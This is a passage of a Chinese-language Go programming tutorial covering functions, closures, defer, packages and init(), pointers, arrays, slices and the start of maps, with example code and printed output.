<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//==========函数============</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">add</span><span class="params">(x <span class="type">int</span>, y <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> x + y</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 先声明返回值，直接用return返回。适用于短函数</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">subtract</span><span class="params">(x <span class="type">int</span>, y <span class="type">int</span>)</span></span> (z <span class="type">int</span>) &#123;</span><br><span class="line">    z = x - y</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回多值</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">swap</span><span class="params">(x, y <span class="type">string</span>)</span></span> (<span class="type">string</span>, <span class="type">string</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> y, x</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">使用：</span></span><br><span class="line"><span class="comment">stringA, stringB = swap(stringA, stringB)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 传指针</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">swap_p</span><span class="params">(x, y *<span class="type">int</span>)</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> temp <span class="type">int</span></span><br><span class="line">    temp = *x    <span class="comment">/* 保持 x 地址上的值 */</span></span><br><span class="line">    *x = *y      <span class="comment">/* 将 y 值赋给 x */</span></span><br><span class="line">    *y = temp    <span class="comment">/* 将 temp 值赋给 y */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// defer栈</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">deferTest</span><span class="params">()</span></span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;counting&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ &#123;</span><br><span class="line">        <span class="keyword">defer</span> fmt.Println(i)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fmt.Println(<span class="string">&quot;done&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">输出</span></span><br><span class="line"><span class="comment">counting</span></span><br><span class="line"><span class="comment">done</span></span><br><span class="line"><span class="comment">9</span></span><br><span class="line"><span class="comment">8</span></span><br><span class="line"><span class="comment">7</span></span><br><span class="line"><span class="comment">6</span></span><br><span class="line"><span class="comment">5</span></span><br><span class="line"><span class="comment">4</span></span><br><span class="line"><span class="comment">3</span></span><br><span class="line"><span class="comment">2</span></span><br><span class="line"><span class="comment">1</span></span><br><span class="line"><span class="comment">0</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p>另外，跟<code>JavaScript</code>一样，go语言也有：</p>
<ul>
<li>函数变量，函数也是属于一类数据类型。</li>
<li>函数做参。多态性的一种体现。</li>
<li>函数作为返回值(函数闭包)。得以使用函数的局部变量。</li>
<li>匿名函数</li>
<li>函数自调用</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 函数做参。函数参数，要指明函数参数的参数类型和返回值类型</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">handleNum</span><span class="params">(num <span class="type">float64</span>, fn <span class="keyword">func</span> (<span class="type">float64</span>)</span></span> <span class="type">float64</span>) &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;函数做参开始&quot;</span>)</span><br><span class="line">    fmt.Println(fn(num))</span><br><span class="line">    fmt.Println(<span class="string">&quot;函数做参结束&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 闭包函数(将函数作为返回值)</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getSequence</span><span class="params">()</span></span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> <span class="type">int</span> &#123;</span><br><span class="line">    i:=<span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> <span class="type">int</span> &#123;</span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> i</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// 函数变量</span></span><br><span class="line">    getSquareRoot := <span class="function"><span class="keyword">func</span><span class="params">(x <span class="type">float64</span>)</span></span> <span class="type">float64</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> math.Sqrt(x)</span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Println(getSquareRoot(<span class="number">9</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 函数做参</span></span><br><span class="line">    handleNum(<span class="number">16</span>, getSquareRoot)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 函数闭包</span></span><br><span class="line">    nextNumber := getSequence()     <span class="comment">// nextNumber 为一个函数，函数 i 为 0</span></span><br><span class="line">    fmt.Println(nextNumber())       <span class="comment">// 调用 nextNumber 函数，i 变量自增 1 并返回</span></span><br><span class="line">    fmt.Println(nextNumber())</span><br><span class="line">    fmt.Println(nextNumber())</span><br><span class="line"></span><br><span class="line">    nextNumber1 := getSequence()    <span class="comment">// 创建新的函数 nextNumber1，并查看结果</span></span><br><span class="line">    fmt.Println(nextNumber1())      <span class="comment">// 输出 1</span></span><br><span class="line">    fmt.Println(nextNumber1())      <span class="comment">// 输出 2</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 匿名函数和函数自调用</span></span><br><span class="line">    <span class="function"><span class="keyword">func</span> <span class="params">(count <span class="type">int</span>)</span></span> &#123;</span><br><span class="line">        fmt.Println(<span class="string">&quot;匿名函数开始&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; count; i++ &#123;</span><br><span class="line">            fmt.Println(i)</span><br><span class="line">        &#125;</span><br><span class="line">        fmt.Println(<span class="string">&quot;匿名函数结束&quot;</span>)</span><br><span class="line">    &#125; (<span class="number">3</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">函数做参开始</span><br><span class="line"><span class="number">4</span></span><br><span class="line">函数做参结束</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line">匿名函数开始</span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line">匿名函数结束</span><br></pre></td></tr></table></figure>

<h3 id="6-包"><a href="#6-包" class="headerlink" title="6. 包"></a>6. 包</h3><h4 id="6-1-包的特性"><a href="#6-1-包的特性" class="headerlink" title="6.1. 包的特性"></a>6.1. 包的特性</h4><p>与<code>java</code>相似，每个<code>.go</code>文件开头需要用<code>package</code>关键字声明文件所属于的<strong>包</strong>。并且，包的名字需要与目录名字相同。<code>main</code>包除外。</p>
<p>例如，项目中有一个<code>routers/</code>目录，<code>routers/</code>目录下有一个<code>router.go</code>文件，那<code>router.go</code>文件开头必须声明所属于的包：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> routers</span><br></pre></td></tr></table></figure>

<h4 id="6-2-main包"><a href="#6-2-main包" class="headerlink" title="6.2. main包"></a>6.2. main包</h4><p>每个程序(项目)都必须有一个<code>main</code>包，编译器会根据<code>main</code>包找到<code>main()</code>函数，这是程序的<strong>入口函数</strong>。若没找到<code>main()</code>函数，程序则不会执行。</p>
<h4 id="6-3-导入包"><a href="#6-3-导入包" class="headerlink" title="6.3. 导入包"></a>6.3. 导入包</h4><p><code>import</code>关键字用于导入一个外包。格式如下：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br></pre></td></tr></table></figure>

<p>或者导入多个包时：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;math&quot;</span></span><br><span class="line">    <span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>根据以上包名，编译器会依次在以下目录中查找：</p>
<p>1）<code>GOROOT/src</code>，安装路径下的<code>src</code>目录<br>2）<code>GOPATH/src</code>，工作空间下的<code>src</code>目录<br>3）若以上都没找到，且包路径中包含<code>URL</code>，那么会从网上获取包，并保存到<code>GOPATH/src</code>目录下。比如：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&quot;github.com/99MyCql/chatRoom/routers&quot;</span></span><br></pre></td></tr></table></figure>

<h4 id="6-4-命名导入"><a href="#6-4-命名导入" class="headerlink" title="6.4. 命名导入"></a>6.4. 命名导入</h4><p>导入包的名字默认为包名，但如果出现重名情况，我们可以通过给包重新命名来化解。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    myfmt <span class="string">&quot;mylib/fmt&quot;</span>   <span class="comment">// myfmt为该包的新名字</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>go语言中若导入了某包(会调用该包中的<code>init()</code>函数)，而又没使用该包，编译器则会报错。</p>
<p>解决这个问题可以使用**空白标识符<code>_</code>**来重命名这个包，表明导入该包却不使用该包。如：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&quot;github.com/99MyCql/chatRoom/routers&quot;</span></span><br></pre></td></tr></table></figure>

<h4 id="6-5-init-函数"><a href="#6-5-init-函数" class="headerlink" title="6.5. init()函数"></a>6.5. init()函数</h4><p>一个包中，可以有<strong>一个</strong>或多个<code>init()</code>函数(多个init()函数不能在同一个<code>.go</code>文件中)。</p>
<p><code>init()</code>函数会在<code>main()</code>函数执行前被调用。</p>
<p>每个被<strong>导入</strong>的包(不管有没有被使用)，都会调用包中的所有<code>init()</code>函数。通常，<code>init()</code>函数被用来进行一些初始化操作。</p>
<p>使用空白标识符<code>_</code>，可以让包中的<code>init()</code>函数被调度使用，同时编译器不会因为包没被使用而报错。</p>
<h4 id="6-6-包中名的可见性-special"><a href="#6-6-包中名的可见性-special" class="headerlink" title="6.6. 包中名的可见性(special)"></a>6.6. 包中名的可见性(special)</h4><p>在一个包内，所有文件的全局变量是共享的。</p>
<p>对于包外，以<strong>大写字母开头</strong>的全局变量和函数是<strong>公开的</strong>，以<strong>小写字母开头的</strong>是<strong>私有的</strong>。如：</p>
<ul>
<li><code>fmt.Println()</code> 是调用<code>fmt</code>包中公开的<code>Println()</code>函数。</li>
<li><code>fmt.Println(math.pi)</code> 输出<code>math</code>包中变量，会报错，因为该变量是私有的。</li>
</ul>
<h4 id="6-7-使用另一个包中的变量和函数"><a href="#6-7-使用另一个包中的变量和函数" class="headerlink" title="6.7. 使用另一个包中的变量和函数"></a>6.7. 使用另一个包中的变量和函数</h4><p>通过 <code>&lt;package name&gt;.&lt;var/fun&gt;</code> 格式(跟C++使用类中变量函数相似)，来使用另一个包中<strong>公开的</strong>变量和函数。如：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">fmt.Println()   <span class="comment">// 使用 fmt 包中 Println() 函数</span></span><br><span class="line">math.PI         <span class="comment">// 使用 math 包中 PI 变量</span></span><br></pre></td></tr></table></figure>

<h2 id="三、进阶数据结构"><a href="#三、进阶数据结构" class="headerlink" title="三、进阶数据结构"></a>三、进阶数据结构</h2><h3 id="1-指针-值-数据类型"><a href="#1-指针-值-数据类型" class="headerlink" title="1. 指针 值-数据类型"></a>1. 指针 值-数据类型</h3><p>与c语言指针类似，go指针指向对应类型的变量。</p>
<p>但不同的是：</p>
<ul>
<li><p>go语言指针不能进行运算</p>
</li>
<li><p>指针变量的声明中，标识符<code>*</code>必须贴近变量类型，而不贴近变量名。如：<code>var name *T</code></p>
</li>
<li><p>指针类型的零值为<code>nil</code></p>
</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 指针变量声明</span></span><br><span class="line"><span class="keyword">var</span> p *<span class="type">int</span></span><br><span class="line">v_p := &amp;v_name1</span><br><span class="line">*v_p = <span class="number">233</span></span><br></pre></td></tr></table></figure>

<!--more-->

<h3 id="2-数组-值-数据类型"><a href="#2-数组-值-数据类型" class="headerlink" title="2. 数组 值-数据类型"></a>2. 数组 值-数据类型</h3><p>go语言数组跟c语言的相似，但也有不同。</p>
<p><strong>特性</strong>：</p>
<ul>
<li><p>格式<code>var name [len]T</code>，如：<code>var a [2]string</code></p>
</li>
<li><p>go语言的数组是一种数据类型，而且是一种值类型。即数组名是一个值，包含着整个数组的数据</p>
</li>
<li><p>需要编译器自己识别数组长度时，不能使<code>[]</code>中空闲，而必须使用<code>[...]</code></p>
</li>
<li><p>指向数组的指针格式为：<code>var name *[len]T</code>，如：<code>var arrp *[5]int</code></p>
</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//====================数组=====================</span></span><br><span class="line"><span class="comment">// 变量 a 是一个值类型，而不是引用类型。包含着整个数组的数据</span></span><br><span class="line"><span class="keyword">var</span> a [<span class="number">2</span>]<span class="type">string</span></span><br><span class="line">a[<span class="number">0</span>] = <span class="string">&quot;Hello&quot;</span></span><br><span class="line">a[<span class="number">1</span>] = <span class="string">&quot;World&quot;</span></span><br><span class="line">fmt.Println(a[<span class="number">0</span>], a[<span class="number">1</span>])</span><br><span class="line">fmt.Println(a)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用字面量声明数组</span></span><br><span class="line">array1 := [<span class="number">5</span>]<span class="type">int</span>&#123;<span class="number">10</span>,<span class="number">20</span>,<span class="number">30</span>,<span class="number">40</span>,<span class="number">50</span>&#125;</span><br><span class="line">array2 := [...]<span class="type">int</span>&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;   <span class="comment">// ... 可以使编译器根据元素数量，自动确定数组长度</span></span><br><span class="line">fmt.Println(array1, array2)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 数组元素类型为指针</span></span><br><span class="line">array3 := [<span class="number">5</span>]*<span class="type">int</span>&#123;<span class="number">0</span>:<span class="built_in">new</span>(<span class="type">int</span>), <span class="number">1</span>:<span class="built_in">new</span>(<span class="type">int</span>)&#125;   <span class="comment">// 用 下标:... 进行特定位置的初始化</span></span><br><span class="line">*array3[<span class="number">0</span>] = <span class="number">10</span></span><br><span class="line">*array3[<span class="number">1</span>] = <span class="number">20</span></span><br><span class="line">fmt.Println(*array3[<span class="number">0</span>])</span><br><span class="line">fmt.Println(array3)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 多维数组</span></span><br><span class="line"><span class="keyword">var</span> array4 [<span class="number">4</span>][<span class="number">2</span>]<span class="type">int</span>    <span class="comment">// 4行2列的二维数组，即有4行，每行有2个int</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 指向数组变量的指针</span></span><br><span class="line">arrP := &amp;a</span><br><span class="line">fmt.Printf(<span class="string">&quot;a &#x27;s type is %T\n&quot;</span>, a)</span><br><span class="line">fmt.Printf(<span class="string">&quot;arrp &#x27;s type is %T\n&quot;</span>, arrP)</span><br><span class="line">(*arrP)[<span class="number">1</span>] = <span class="string">&quot;Today&quot;</span>    <span class="comment">// arrP[1] = &quot;Today&quot; 也可以</span></span><br><span class="line">fmt.Println(*arrP)</span><br><span class="line"></span><br><span class="line"><span class="comment">// new 指向数组的指针</span></span><br><span class="line"><span class="keyword">var</span> arrp *[<span class="number">5</span>]<span class="type">int</span>    <span class="comment">// 此时为nil</span></span><br><span class="line">fmt.Println(arrp)   <span class="comment">// 输出 nil</span></span><br><span class="line">arrp = <span class="built_in">new</span>([<span class="number">5</span>]<span class="type">int</span>)  <span class="comment">// 分配相应的数组空间，并返回指针</span></span><br><span class="line">fmt.Println(arrp)   <span class="comment">// 输出 &amp;[0 0 0 0 0]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 与c语言的不同，go的数组名是值而不是指针。以下按照c语言的思路，在go中是错误的</span></span><br><span class="line"><span class="comment">// var p *int</span></span><br><span class="line"><span class="comment">// p = a</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 数组是值类型而不是引用类型的示例</span></span><br><span class="line">arrA := [<span class="number">2</span>]<span class="type">int</span>&#123;<span class="number">1</span>,<span class="number">2</span>&#125;</span><br><span class="line">arrB := arrA    <span class="comment">// 相当于赋值了整个数组的值</span></span><br><span class="line">arrB[<span class="number">1</span>] = <span class="number">3</span></span><br><span class="line">fmt.Println(arrA, arrB) <span class="comment">// 输出 [1 2] [1 3]</span></span><br></pre></td></tr></table></figure>

<p>输出：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Hello World</span><br><span class="line">[Hello World]</span><br><span class="line">[10 20 30 40 50] [1 2 3 4 5]</span><br><span class="line">10</span><br><span class="line">[0xc42008a018 0xc42008a030 &lt;nil&gt; &lt;nil&gt; &lt;nil&gt;]</span><br><span class="line">[[0 20] [0 0] [0 60] [0 0]]</span><br><span class="line">a &#x27;s type is [2]string</span><br><span class="line">arrp &#x27;s type is *[2]string</span><br><span class="line">[Hello Today]</span><br><span class="line">&lt;nil&gt;</span><br><span class="line">&amp;[0 0 0 0 0]</span><br><span class="line">[1 2] [1 3]</span><br></pre></td></tr></table></figure>

<p><strong>注意</strong>：</p>
<p>由于在go语言中，数组类型是值类型而不是引用类型。所以，在<strong>函数传参</strong>时，我们需要<strong>传入指向数组的指针</strong>，而不是数组值。但，若是希望拿到该数组的副本，则可以选择使用传入值。</p>
<p>同时，指向数组的指针还必须<strong>指明数组的长度</strong>，这其实十分不方便。但切片可以很好地解决这个问题。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 10的6次方数组</span></span><br><span class="line"><span class="keyword">var</span> array [<span class="number">1e6</span>]<span class="type">int</span></span><br><span class="line">foo(&amp;array)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数接受一个指向包含100万个整型值数组的指针</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">foo</span><span class="params">(array *[1e6]<span class="type">int</span>)</span></span> &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="3-切片-引用-数据类型"><a href="#3-切片-引用-数据类型" class="headerlink" title="3. 切片 引用-数据类型"></a>3. 切片 引用-数据类型</h3><p>切片是go自带的数据类型，围绕<strong>动态数组</strong>的概念来构建。</p>
<p>同时，切片是一个<strong>引用类型</strong>，所以切片的零值为<code>nil</code>。</p>
<h4 id="3-1-切片的内部实现"><a href="#3-1-切片的内部实现" class="headerlink" title="3.1. 切片的内部实现"></a>3.1. 切片的内部实现</h4><p>切片其实是一个很小的结构体，对底层数组进行了抽象。“切片结构体”包含三个属性：</p>
<ul>
<li><p>指向底层数组的指针。底层数组会一直存在，直到没有指向它的切片</p>
</li>
<li><p>切片的长度。动态数组的长度</p>
</li>
<li><p>切片的容量。容量相当于动态数组的长度上限</p>
</li>
</ul>
<h4 id="3-2-切片的创建和初始化"><a href="#3-2-切片的创建和初始化" class="headerlink" title="3.2. 切片的创建和初始化"></a>3.2. 切片的创建和初始化</h4><ul>
<li><p>格式为：<code>name []T</code>。注意<code>[]</code>中无值，有值为数组</p>
</li>
<li><p>未初始化的切片为“空指针”，零值为<code>nil</code></p>
</li>
<li><p>用<code>make</code>关键字创建，还可以声明切片的长度和容量。推荐</p>
</li>
<li><p>通过数组或切片<code>[x:y]</code>来创建切片(包含<code>x</code>位元素，排除<code>y</code>位元素)，可以使用<code>[x:]</code>、<code>[:y]</code>等，还可以通过<code>[x:y:z]</code>规定切片的容量(<code>z</code>)</p>
</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 切片的创建和初始化</span></span><br><span class="line"><span class="comment">// 注意切片和数组的区别</span></span><br><span class="line"><span class="keyword">var</span> slice1 []<span class="type">int</span>                <span class="comment">// nil切片(空指针)，指向底层数组的指针为空</span></span><br><span class="line"><span class="keyword">if</span> slice1 == <span class="literal">nil</span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;slice1 is nil&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">slice2 := []<span class="type">int</span>&#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>:<span class="number">6</span>&#125;    <span class="comment">// 创建并初始化，跟数组很像</span></span><br><span class="line">slice3 := <span class="built_in">make</span>([]<span class="type">int</span>, <span class="number">0</span>)        <span class="comment">// 空切片(不是nil切片)，长度和容量为0</span></span><br><span class="line">slice4 := <span class="built_in">make</span>([]<span class="type">string</span>, <span class="number">5</span>)     <span class="comment">// 用make创建字符串切片，长度和容量都为5</span></span><br><span class="line">slice5 := <span class="built_in">make</span>([]<span class="type">int</span>, <span class="number">3</span>, <span class="number">5</span>)     <span class="comment">// 长度为3，容量为5</span></span><br><span class="line">fmt.Println(slice1, slice2, slice3, slice4, slice5)</span><br><span class="line"></span><br><span class="line">arr := [<span class="number">5</span>]<span class="type">int</span>&#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;</span><br><span class="line">arrSlice1 := arr[<span class="number">1</span>:<span class="number">3</span>]           <span class="comment">// 用数组创建切片。此时切片指向该数组下标1位置，并且长度为2、容量为4(下标1到原数组结束)</span></span><br><span class="line">arrSlice2 := arr[<span class="number">1</span>:<span class="number">3</span>:<span class="number">3</span>]         <span class="comment">// 规定容量为3(容量不可超过原数组)。此时，arrSlice1和arrSlice2共享同一个底层数组</span></span><br><span class="line">newSlice1 := slice2[<span class="number">1</span>:<span class="number">3</span>]        <span class="comment">// 用切片构建切片。两个切片共享一个底层数组</span></span><br><span class="line">newSlice2 := newSlice1</span><br><span class="line">fmt.Println(arr, arrSlice1, arrSlice2, newSlice1, newSlice2)</span><br></pre></td></tr></table></figure>

<p>输出：</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">slice1 is nil</span><br><span class="line">[] [0 1 2 3 0 6] [] [    ] [0 0 0]</span><br><span class="line">[0 1 2 3 4] [1 2] [1 2] [1 2] [1 2]</span><br></pre></td></tr></table></figure>

<h4 id="3-3-切片的使用"><a href="#3-3-切片的使用" class="headerlink" title="3.3. 切片的使用"></a>3.3. 切片的使用</h4><ul>
<li><p><code>len()</code>函数获取切片长度，<code>cap()</code>函数获取切片容量</p>
</li>
<li><p><code>func copy(dst, src []T) int</code> 将<code>src</code>切片的内容拷贝到<code>dst</code>切片中，拷贝的长度为两个slice中长度较小的长度值</p>
</li>
<li><p><code>func append(s []T, x ...T) []T</code> 返回一个新切片。当原切片容量不足时，<code>append</code>函数会创建一个<strong>新的容量更大的底层数组</strong>，并将原切片的底层数组复制到新数组里，再追加新的值。<code>append(dist, x, y)</code>追加多个值(<code>x</code>,<code>y</code>…)到<code>dist</code>切片。<code>append(dist, src...)</code>将整个<code>src</code>切片追加到<code>dist</code>切片尾。</p>
</li>
<li><p>切片的多维和遍历&#x2F;迭代，与数组一样</p>
</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// len() 和 cap()</span></span><br><span class="line">fmt.Printf(<span class="string">&quot;slice5 is %v, len is %d, capacity is %d\n&quot;</span>, slice5, <span class="built_in">len</span>(slice5), <span class="built_in">cap</span>(slice5))</span><br><span class="line">fmt.Printf(<span class="string">&quot;arrSlice1 is %v, len is %d, capacity is %d\n&quot;</span>, arrSlice1, <span class="built_in">len</span>(arrSlice1), <span class="built_in">cap</span>(arrSlice1))</span><br><span class="line"></span><br><span class="line"><span class="comment">// func copy(dst, src []T) int</span></span><br><span class="line"><span class="built_in">copy</span>(slice5, arrSlice1)     <span class="comment">// copy()函数会根据长度复制</span></span><br><span class="line">fmt.Printf(<span class="string">&quot;slice5 is %v, len is %d, capacity is %d\n&quot;</span>, slice5, <span class="built_in">len</span>(slice5), <span class="built_in">cap</span>(slice5))</span><br><span class="line"></span><br><span class="line"><span class="comment">// func append(s []T, x ...T) []T   返回一个新切片</span></span><br><span class="line"><span class="comment">// 当追加后，目标切片长度超过容量时，append函数会创建一个新的容量更大的底层数组，将原本数组复制到新数组中，再追加新的值</span></span><br><span class="line">slice1 = <span class="built_in">append</span>(slice1, <span class="number">10</span>)</span><br><span class="line">fmt.Printf(<span class="string">&quot;slice1 is %v, len is %d, capacity is %d\n&quot;</span>, slice1, <span class="built_in">len</span>(slice1), <span class="built_in">cap</span>(slice1))</span><br><span class="line">slice1 = <span class="built_in">append</span>(slice1, slice2...)  <span class="comment">// 用标识符 ... 将整个切片追加到另一个切片</span></span><br><span class="line">fmt.Printf(<span class="string">&quot;slice1 is %v, len is %d, capacity is %d\n&quot;</span>, slice1, <span class="built_in">len</span>(slice1), <span class="built_in">cap</span>(slice1))</span><br></pre></td></tr></table></figure>

<p>输出：</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">slice5 is [0 0 0], len is 3, capacity is 5</span><br><span class="line">arrSlice1 is [1 2], len is 2, capacity is 4</span><br><span class="line">slice5 is [1 2 0], len is 3, capacity is 5</span><br><span class="line">slice1 is [10], len is 1, capacity is 1</span><br><span class="line">slice1 is [10 0 1 2 3 0 6], len is 7, capacity is 8</span><br></pre></td></tr></table></figure>

<h4 id="3-4-切片的“陷阱”"><a href="#3-4-切片的“陷阱”" class="headerlink" title="3.4. 切片的“陷阱”"></a>3.4. 切片的“陷阱”</h4><p>切片赋值后，两个切片会共享同一个底层数组，一个切片修改值时会影响到另一个数组。切片共享底层数组示例图：</p>
<p><img src="/go%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8/slice.png" alt="slice"></p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 切片赋值后，会共用一个底层数组</span></span><br><span class="line">sliceA := []<span class="type">string</span>&#123;<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;world&quot;</span>, <span class="string">&quot;!&quot;</span>, <span class="string">&quot;!&quot;</span>, <span class="string">&quot;!&quot;</span>&#125;</span><br><span class="line">fmt.Printf(<span class="string">&quot;sliceA is %v\n&quot;</span>, sliceA)</span><br><span class="line">sliceB := sliceA[:<span class="number">3</span>]</span><br><span class="line">sliceB[<span class="number">2</span>] = <span class="string">&quot;?&quot;</span>         <span class="comment">// 由于sliceB和sliceA共享一个底层数组，通过sliceB修改底层数组，会影响到sliceA</span></span><br><span class="line">fmt.Printf(<span class="string">&quot;sliceB is %v\n&quot;</span>, sliceB)</span><br><span class="line">fmt.Printf(<span class="string">&quot;sliceA changs : %v\n&quot;</span>, sliceA)</span><br></pre></td></tr></table></figure>

<p>输出：</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">sliceA is [hello world ! ! !]</span><br><span class="line">sliceB is [hello world ?]</span><br><span class="line">sliceA changs : [hello world ? ! !]</span><br></pre></td></tr></table></figure>

<h3 id="4-映射-引用-数据类型"><a href="#4-映射-引用-数据类型" class="headerlink" title="4. 映射 引用-数据类型"></a>4. 映射 引用-数据类型</h3><p>映射又称map、键值对，基于特定的hash函数&#x2F;散列函数。</p>
<p>映射也是<strong>引用类型</strong>，零值为<code>nil</code>。</p>
<h4 id="4-1-映射的创建和初始化"><a href="#4-1-映射的创建和初始化" class="headerlink" title="4.1. 映射的创建和初始化"></a>4.1. 映射的创建和初始化</h4><ul>
<li><p>格式：<code>name map[keyT]valueT</code></p>
</li>
<li><p>未初始化的声明会创建<code>nil</code>映射。nil 映射既没有键，也不能添加键</p>
</li>
<li><p>用<code>make()</code>函数进行创建，产生空映射而非<code>nil</code>映射</p>
</li>
<li><p>用字面量初始化声明映射，采用换行的形式，需要在最后一个键值对后加 <code>,</code></p>
</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 映射的创建和初始化</span></span><br><span class="line"><span class="keyword">var</span> dictNil <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">int</span>  <span class="comment">// 声明了一个nil映射，nil 映射既没有键，也不能添加键</span></span><br><span class="line"><span class="keyword">if</span> dictNil == <span class="literal">nil</span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;dictNil is nil&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// dictNil[&quot;red&quot;] = 1   运行时会报错</span></span><br><span class="line">dict1 := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]<span class="type">int</span>)    <span class="comment">// 用make()函数创建的map，是空映射，而不是nil映射。映射/键值对中键的类型不能是切片、函数等引用数据类型</span></span><br><span class="line">dict1[<span class="string">&quot;red&quot;</span>] = <span class="number">1</span></span><br><span class="line">dict2 := <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">string</span> &#123;</span><br><span class="line">    <span class="string">&quot;Red&quot;</span>: <span class="string">&quot;#da1337&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Orange&quot;</span>: <span 